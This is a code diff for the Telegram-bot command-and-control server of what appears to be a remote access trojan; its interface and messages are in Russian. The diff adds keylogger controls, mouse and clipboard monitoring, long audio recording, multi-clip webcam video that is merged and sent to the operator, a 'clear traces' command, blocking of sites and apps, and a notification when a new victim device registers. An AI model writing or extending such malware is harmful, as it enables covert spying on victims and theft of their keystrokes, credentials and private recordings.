@@ -19,6 +19,10 @@ import base64
 import os
 from datetime import datetime
 import asyncio
+import tempfile
+import cv2
+import numpy as np
+import shutil
 
 bot_instance = None
 
@@ -192,6 +196,37 @@ class ServerBot:
                              (device_id, f"killprocess:{proc}"))
             await update.message.reply_text(f"Команда 'killprocess {proc}' отправлена устройству. Ожидайте...")
             await self.show_devices_list(update.effective_chat.id)
+        elif 'video_multi_device' in context.user_data:
+            device_id = context.user_data.pop('video_multi_device')
+            try:
+                count = int(update.message.text.strip())
+                if count < 1 or count > 10:
+                    raise ValueError
+            except Exception:
+                await update.message.reply_text("Введите число от 1 до 10!")
+                context.user_data['video_multi_device'] = device_id
+                return
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, f"record_video_multi:{count}"))
+            await update.message.reply_text(f"Команда 'Мультизапись видео x{count}' отправлена устройству. Ожидайте...")
+            await self.show_devices_list(update.effective_chat.id)
+        elif 'block_site_device' in context.user_data:
+            device_id = context.user_data.pop('block_site_device')
+            url = update.message.text.strip()
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, f"block_site:{url}"))
+            await update.message.reply_text(f"Сайт {url} будет заблокирован.")
+            await self.show_devices_list(update.effective_chat.id)
+        elif 'block_app_device' in context.user_data:
+            device_id = context.user_data.pop('block_app_device')
+            name = update.message.text.strip()
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, f"block_app:{name}"))
+            await update.message.reply_text(f"Приложение {name} будет заблокировано (завершено).")
+            await self.show_devices_list(update.effective_chat.id)
 
     async def photo_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -258,8 +293,12 @@ class ServerBot:
                 [InlineKeyboardButton("🖼️ Скриншот", callback_data=f"action_{device_id}_screenshot")],
                 [InlineKeyboardButton("📸 Веб-камера", callback_data=f"action_{device_id}_webcam")],
                 [InlineKeyboardButton("🎥 Запись видео (10 сек)", callback_data=f"action_{device_id}_record_video_10")],
+                [InlineKeyboardButton("🎥 Мультизапись видео", callback_data=f"action_{device_id}_record_video_multi")],
                 [InlineKeyboardButton("🎤 Запись звука (10 сек)", callback_data=f"action_{device_id}_record_audio_10")],
                 [InlineKeyboardButton("🖼️ Открыть картинку", callback_data=f"action_{device_id}_open_image")],
+                [InlineKeyboardButton("🔊 +10%", callback_data=f"action_{device_id}_volume_up_10")],
+                [InlineKeyboardButton("🔉 -10%", callback_data=f"action_{device_id}_volume_down_10")],
+                [InlineKeyboardButton("🔇 Mute", callback_data=f"action_{device_id}_volume_mute")],
                 [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
             ]
             await self.application.bot.send_message(
@@ -267,6 +306,90 @@ class ServerBot:
                 text="Мультимедиа функции:",
                 reply_markup=InlineKeyboardMarkup(keyboard)
             )
+        elif action == "record_video_multi":
+            # Запросить у пользователя количество видео
+            context.user_data['video_multi_device'] = device_id
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Введите количество видео для записи (по 10 сек каждое):"
+            )
+        elif action.startswith("record_video_multi_"):
+            # Принять число и отправить команду
+            count = action.split('_')[-1]
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, f"record_video_multi:{count}"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text=f"Команда 'Мультизапись видео x{count}' отправлена устройству. Ожидайте...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
+        elif action == "windows_menu":
+            # Получить список окон
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "list_windows"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Команда 'Получить список окон' отправлена устройству. Ожидайте...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
+        elif action.startswith("window_action_"):
+            # window_action_{hwnd}_{act}
+            parts = action.split('_')
+            hwnd = parts[2]
+            act = parts[3]
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, f"window_action:{hwnd}:{act}"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text=f"Команда для окна {hwnd} ({act}) отправлена устройству.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
+        elif action == "system_info":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "system_info"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Команда 'Информация о системе' отправлена устройству. Ожидайте...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
+        elif action == "volume_up_10":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "volume_up_10"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Команда 'Громкость +10%' отправлена устройству.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
+        elif action == "volume_down_10":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "volume_down_10"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Команда 'Громкость -10%' отправлена устройству.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
+        elif action == "volume_mute":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "volume_mute"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Команда 'Mute' отправлена устройству.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
+                ]))
         elif action == "control_menu":
             keyboard = [
                 [InlineKeyboardButton("🖱️ Клик мыши", callback_data=f"action_{device_id}_mouse_click")],
@@ -292,16 +415,34 @@ class ServerBot:
                 text="Выберите комбинацию клавиш или введите свою:",
                 reply_markup=InlineKeyboardMarkup(keyboard))
         elif action.startswith("hotkey:"):
-            hotkey = action.split(":", 1)[1]
-            with sqlite3.connect(DATABASE) as conn:
-                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
-                             (device_id, f"hotkey:{hotkey}"))
-            await self.application.bot.send_message(
-                chat_id=chat_id,
-                text=f"Команда 'hotkey {hotkey}' отправлена устройству. Ожидайте...",
-                reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
-                ]))
+            hotkey = action.split(":", 1)[1].lower()
+            if hotkey in ["win+l", "win+L"]:
+                with sqlite3.connect(DATABASE) as conn:
+                    conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                                 (device_id, "lock"))
+                await self.application.bot.send_message(
+                    chat_id=chat_id,
+                    text=f"Команда 'Блокировка экрана (Win+L)' отправлена устройству. Ожидайте...",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
+                    ]))
+            elif hotkey in ["ctrl+alt+delete", "ctrl+alt+del"]:
+                await self.application.bot.send_message(
+                    chat_id=chat_id,
+                    text="Ошибка: Ctrl+Alt+Delete нельзя эмулировать программно в Windows.",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
+                    ]))
+            else:
+                with sqlite3.connect(DATABASE) as conn:
+                    conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                                 (device_id, f"hotkey:{hotkey}"))
+                await self.application.bot.send_message(
+                    chat_id=chat_id,
+                    text=f"Команда 'hotkey {hotkey}' отправлена устройству. Ожидайте...",
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
+                    ]))
         elif action == "hotkey_custom":
             context.user_data['hotkey_device'] = device_id
             await self.application.bot.send_message(
@@ -316,12 +457,186 @@ class ServerBot:
                 [InlineKeyboardButton("💤 Спящий режим", callback_data=f"action_{device_id}_sleep")],
                 [InlineKeyboardButton("🔌 Выключить", callback_data=f"action_{device_id}_shutdown")],
                 [InlineKeyboardButton("🔄 Перезагрузить", callback_data=f"action_{device_id}_reboot")],
+                [InlineKeyboardButton("📝 Кейлоггер", callback_data=f"action_{device_id}_keylogger_menu")],
+                [InlineKeyboardButton("🖱️ Мониторинг мыши", callback_data=f"action_{device_id}_mouse_menu")],
+                [InlineKeyboardButton("🗔 Окна", callback_data=f"action_{device_id}_windows_menu")],
+                [InlineKeyboardButton("📋 Буфер обмена", callback_data=f"action_{device_id}_clipboard_monitor")],
+                [InlineKeyboardButton("🗂️ Приложения", callback_data=f"action_{device_id}_apps_monitor")],
+                [InlineKeyboardButton("🧹 Очистить следы", callback_data=f"action_{device_id}_clear_traces")],
+                [InlineKeyboardButton("🚫 Блокировка сайта", callback_data=f"action_{device_id}_block_site")],
+                [InlineKeyboardButton("🚫 Блокировка приложения", callback_data=f"action_{device_id}_block_app")],
+                [InlineKeyboardButton("🎤 Длительная запись аудио", callback_data=f"action_{device_id}_audio_menu")],
                 [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
             ]
             await self.application.bot.send_message(
                 chat_id=chat_id,
                 text="Системные функции:",
                 reply_markup=InlineKeyboardMarkup(keyboard))
+        elif action == "keylogger_menu":
+            keyboard = [
+                [InlineKeyboardButton("▶️ Старт", callback_data=f"action_{device_id}_keylogger_start")],
+                [InlineKeyboardButton("⏹️ Стоп", callback_data=f"action_{device_id}_keylogger_stop")],
+                [InlineKeyboardButton("📤 Выгрузить", callback_data=f"action_{device_id}_keylogger_dump")],
+                [InlineKeyboardButton("🧹 Очистить", callback_data=f"action_{device_id}_keylogger_clear")],
+                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+            ]
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Кейлоггер:",
+                reply_markup=InlineKeyboardMarkup(keyboard))
+        elif action == "keylogger_start":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "keylogger_start"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Кейлоггер запущен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
+                ]))
+        elif action == "keylogger_stop":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "keylogger_stop"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Кейлоггер остановлен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
+                ]))
+        elif action == "keylogger_dump":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "keylogger_dump"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Лог кейлоггера будет отправлен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
+                ]))
+        elif action == "keylogger_clear":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "keylogger_clear"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Лог кейлоггера очищен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
+                ]))
+        elif action == "mouse_menu":
+            keyboard = [
+                [InlineKeyboardButton("▶️ Старт", callback_data=f"action_{device_id}_mouse_monitor_start")],
+                [InlineKeyboardButton("⏹️ Стоп", callback_data=f"action_{device_id}_mouse_monitor_stop")],
+                [InlineKeyboardButton("📤 Выгрузить", callback_data=f"action_{device_id}_mouse_monitor_dump")],
+                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+            ]
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Мониторинг мыши:",
+                reply_markup=InlineKeyboardMarkup(keyboard))
+        elif action == "mouse_monitor_start":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "mouse_monitor_start"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Мониторинг мыши запущен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_mouse_menu")]
+                ]))
+        elif action == "mouse_monitor_stop":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "mouse_monitor_stop"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Мониторинг мыши остановлен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_mouse_menu")]
+                ]))
+        elif action == "mouse_monitor_dump":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "mouse_monitor_dump"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Лог мыши будет отправлен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_mouse_menu")]
+                ]))
+        elif action == "apps_monitor":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "apps_monitor"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Список приложений будет отправлен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+                ]))
+        elif action == "clipboard_monitor":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "clipboard_monitor"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Буфер обмена будет отправлен.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+                ]))
+        elif action == "clear_traces":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "clear_traces"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Команда очистки следов отправлена.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+                ]))
+        elif action == "block_site":
+            context.user_data['block_site_device'] = device_id
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Введите домен сайта для блокировки (например: vk.com):"
+            )
+        elif action == "block_app":
+            context.user_data['block_app_device'] = device_id
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Введите имя процесса для блокировки (например: chrome.exe):"
+            )
+        elif action == "audio_menu":
+            keyboard = [
+                [InlineKeyboardButton("▶️ Начать запись", callback_data=f"action_{device_id}_record_audio_start")],
+                [InlineKeyboardButton("⏹️ Остановить запись", callback_data=f"action_{device_id}_record_audio_stop")],
+                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
+            ]
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Длительная запись аудио:",
+                reply_markup=InlineKeyboardMarkup(keyboard))
+        elif action == "record_audio_start":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "record_audio_start"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Длительная запись аудио начата.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_audio_menu")]
+                ]))
+        elif action == "record_audio_stop":
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                             (device_id, "record_audio_stop"))
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Остановка и отправка аудиозаписи.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_audio_menu")]
+                ]))
         elif action == "cmd_menu":
             keyboard = [
                 [InlineKeyboardButton("ipconfig", callback_data=f"action_{device_id}_cmd:ipconfig")],
@@ -393,14 +708,26 @@ class ServerBot:
 @api.post("/register")
 async def register_device(request: Request):
     data = await request.json()
-    
+    device_id = data['device_id']
+    is_new = False
     with sqlite3.connect(DATABASE) as conn:
+        c = conn.cursor()
+        c.execute('SELECT COUNT(*) FROM devices WHERE device_id=?', (device_id,))
+        if c.fetchone()[0] == 0:
+            is_new = True
         conn.execute('''INSERT OR REPLACE INTO devices 
                       (device_id, name, ip, os, last_seen, is_online)
                       VALUES (?, ?, ?, ?, datetime('now'), 1)''',
-                   (data['device_id'], data['system_info']['name'],
+                   (device_id, data['system_info']['name'],
                     data['system_info']['ip'], data['system_info']['os']))
-    
+    if is_new and bot_instance:
+        try:
+            await bot_instance.application.bot.send_message(
+                chat_id=ADMIN_IDS[0],
+                text=f"🆕 Новое устройство зарегистрировано:\nID: {device_id}\nИмя: {data['system_info']['name']}\nIP: {data['system_info']['ip']}\nOS: {data['system_info']['os']}"
+            )
+        except Exception as e:
+            logger.error(f"Ошибка отправки уведомления о новом устройстве: {e}")
     return {"status": "success"}
 
 @api.post("/heartbeat")
@@ -436,35 +763,98 @@ async def command_result(request: Request):
     file_type = data.get('file_type')
     file_data = data.get('file_data')
     
-    if bot_instance:
-        try:
-            if file_type and file_data:
-                file_bytes = base64.b64decode(file_data)
-                if file_type == 'photo':
-                    await bot_instance.application.bot.send_photo(
+    if file_type == 'video' and 'Видео' in result:
+        temp_dir = os.path.join(tempfile.gettempdir(), f"video_multi_{device_id}")
+        os.makedirs(temp_dir, exist_ok=True)
+        idx = len(os.listdir(temp_dir)) + 1
+        video_path = os.path.join(temp_dir, f"part{idx}.avi")
+        with open(video_path, 'wb') as f:
+            f.write(base64.b64decode(file_data))
+        if f"{idx}/" in result:
+            pass
+        else:
+            files = sorted([os.path.join(temp_dir, f) for f in os.listdir(temp_dir) if f.endswith('.avi')])
+            if len(files) > 1:
+                out_path = os.path.join(temp_dir, 'merged.avi')
+                try:
+                    frames = []
+                    for f in files:
+                        cap = cv2.VideoCapture(f)
+                        while True:
+                            ret, frame = cap.read()
+                            if not ret:
+                                break
+                            frames.append(frame)
+                        cap.release()
+                    if frames:
+                        h, w, _ = frames[0].shape
+                        out = cv2.VideoWriter(out_path, cv2.VideoWriter_fourcc(*'MJPG'), 5.0, (w, h))
+                        for frame in frames:
+                            out.write(frame)
+                        out.release()
+                        with open(out_path, 'rb') as f:
+                            merged_bytes = f.read()
+                        await bot_instance.application.bot.send_video(
+                            chat_id=ADMIN_IDS[0],
+                            video=merged_bytes,
+                            caption=f"Склеенное видео с устройства {device_id}"
+                        )
+                        shutil.rmtree(temp_dir)
+                except Exception as e:
+                    logger.error(f"Ошибка склейки видео: {e}")
+    elif result and result.count(':') > 5 and all(':' in line for line in result.splitlines()):
+        lines = result.splitlines()
+        keyboard = []
+        for line in lines:
+            try:
+                hwnd, title = line.split(':', 1)
+                hwnd = hwnd.strip()
+                title = title.strip()
+                row = [
+                    InlineKeyboardButton(f"🗔 {title}", callback_data=f"noop") ,
+                    InlineKeyboardButton("🔽", callback_data=f"action_{device_id}_window_action_{hwnd}_minimize"),
+                    InlineKeyboardButton("🔼", callback_data=f"action_{device_id}_window_action_{hwnd}_restore"),
+                    InlineKeyboardButton("❌", callback_data=f"action_{device_id}_window_action_{hwnd}_close")
+                ]
+                keyboard.append(row)
+            except:
+                continue
+        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")])
+        await bot_instance.application.bot.send_message(
+            chat_id=ADMIN_IDS[0],
+            text="Список окон:",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    else:
+        if bot_instance:
+            try:
+                if file_type and file_data:
+                    file_bytes = base64.b64decode(file_data)
+                    if file_type == 'photo':
+                        await bot_instance.application.bot.send_photo(
+                            chat_id=ADMIN_IDS[0],
+                            photo=file_bytes,
+                            caption=f"Результат с устройства {device_id}\n\n{result}"
+                        )
+                    elif file_type == 'video':
+                        await bot_instance.application.bot.send_video(
+                            chat_id=ADMIN_IDS[0],
+                            video=file_bytes,
+                            caption=f"Результат с устройства {device_id}\n\n{result}"
+                        )
+                    elif file_type == 'audio':
+                        await bot_instance.application.bot.send_audio(
+                            chat_id=ADMIN_IDS[0],
+                            audio=file_bytes,
+                            caption=f"Результат с устройства {device_id}\n\n{result}"
+                        )
+                else:
+                    await bot_instance.application.bot.send_message(
                         chat_id=ADMIN_IDS[0],
-                        photo=file_bytes,
-                        caption=f"Результат с устройства {device_id}\n\n{result}"
+                        text=f"Результат выполнения команды:\n\n{result}"
                     )
-                elif file_type == 'video':
-                    await bot_instance.application.bot.send_video(
-                        chat_id=ADMIN_IDS[0],
-                        video=file_bytes,
-                        caption=f"Результат с устройства {device_id}\n\n{result}"
-                    )
-                elif file_type == 'audio':
-                    await bot_instance.application.bot.send_audio(
-                        chat_id=ADMIN_IDS[0],
-                        audio=file_bytes,
-                        caption=f"Результат с устройства {device_id}\n\n{result}"
-                    )
-            else:
-                await bot_instance.application.bot.send_message(
-                    chat_id=ADMIN_IDS[0],
-                    text=f"Результат выполнения команды:\n\n{result}"
-                )
-        except Exception as e:
-            logger.error(f"Ошибка отправки результата: {e}")
+            except Exception as e:
+                logger.error(f"Ошибка отправки результата: {e}")
     
     with sqlite3.connect(DATABASE) as conn:
         conn.execute("UPDATE commands SET status='completed' WHERE id=?",
